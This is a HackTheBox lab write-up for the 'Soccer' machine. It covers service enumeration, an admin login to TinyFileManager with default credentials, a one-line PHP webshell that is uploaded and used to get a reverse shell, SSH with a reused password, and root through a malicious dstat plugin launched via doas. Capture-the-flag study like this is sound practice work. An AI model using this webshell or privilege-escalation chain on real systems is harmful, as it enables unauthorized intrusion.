# Soccer

**Platform:** HackTheBox
**OS:** Linux
**Tags:** TinyFileManager, Default Creds, Webshell, doas, Plugin Hijack, File Upload, Privilege Escalation
**Date:** 2026-09-03

nginx on 80, unknown service on 9091. Directory scan found TinyFileManager at `/tiny` on default credentials. Uploaded a PHP webshell and caught a shell as `www-data`. Reused credentials got SSH access as `player`. An unusual SUID binary, `doas`, pointed to the privesc. Player could run `dstat` as root via `doas` and the plugin directory at `/usr/local/share/dstat` was group-writable. Dropped a plugin, got root.

## 1. Enumeration

Started with a service scan.

```bash
nmap -sC -sV 10.129.53.100
```

Findings:
- 22/tcp - OpenSSH 8.2p1 (Ubuntu)
- 80/tcp - nginx 1.18.0, redirects to soccer.htb
- 9091/tcp - HTTP, unknown service, JSON error pages, CSP headers

Port 80 redirected to soccer.htb. Added it to `/etc/hosts`.

## 2. Web Enumeration

Scanned against the vhost, not the raw IP. Scanning by IP triggered nginx's default catch-all and caused wildcard detection noise. Everything redirected to soccer.htb, making results useless.

```bash
gobuster dir -u http://soccer.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -t 50
```

- /tiny - 301, TinyFileManager

dirb's common.txt missed it. raft-medium-directories found it.

## 3. TinyFileManager: Default Credentials

Browsed to `http://soccer.htb/tiny/tinyfilemanager.php`. Tried the documented defaults.

```
admin / admin@123
```

**Result:** Logged straight in as admin.

Tried the H3K TinyFileManager RCE exploit first. It exited silently - its path logic assumed uploads landed at `/tiny/uploads/` but the manager was writing to `/var/www/html/`. The verification request hit the wrong URL. Skipped the script and uploaded manually.

## 4. Webshell and Reverse Shell

Uploaded `shell.php` through the TinyFileManager UI as admin.

```php
<?php system($_REQUEST['cmd']); ?>
```

Confirmed execution.

```bash
curl "http://soccer.htb/shell.php?cmd=id"
```

Started penelope on port 4444 and triggered a reverse shell through the webshell. Earlier attempts on ports 1337 and 1334 didn't connect - matching the listener to penelope's default 4444 worked.

```bash
penelope
```

**Result:** Reverse shell caught as `www-data`.

## 5. Lateral Move: SSH as player

www-data can't read player's flag directly.

```bash
cat /home/player/user.txt
# Permission denied
```

Found credentials for player during enumeration. Tried them over SSH.

```bash
ssh player@10.129.53.100
# PlayerOftheMatch2022
```

Ran quick checks after getting in.

```bash
sudo -l
# user player may not run sudo on localhost

find / -type f -perm -4000 2>/dev/null
# /usr/local/bin/doas
```

**Finding:** `doas`, OpenBSD's sudo alternative. Not a stock Ubuntu binary.

## 6. PrivEsc: doas + dstat Plugin RCE

Checked the doas config.

```bash
cat /usr/local/etc/doas.conf
# permit nopass player as root cmd /usr/bin/dstat
```

Player can run dstat as root with no password. dstat loads Python plugins from fixed directories. Checked which ones were writable.

```bash
ls -la /usr/share/dstat
# root:root 755 - not writable

ls -la /usr/local/share/dstat
# root:player 770 - writable by player
```

Dropped a malicious plugin into the writable directory.

```bash
echo 'import os; os.system("/bin/bash")' \
  > /usr/local/share/dstat/dstat_pwn.py
```

Confirmed dstat picked it up, then triggered it.

```bash
doas /usr/bin/dstat --list
# /usr/local/share/dstat:
#     pwn

doas /usr/bin/dstat --pwn
```

```
whoami
# root
```

**Result:** Root shell. Note: placing the plugin in `~/.dstat/` failed. doas resets HOME by default (no keepenv), so `~` resolved to `/root/.dstat`, not writable by player. `/usr/local/share/dstat` was the actual writable path.

## 7. Flags

- User: `redacted`
- Root: `redacted`
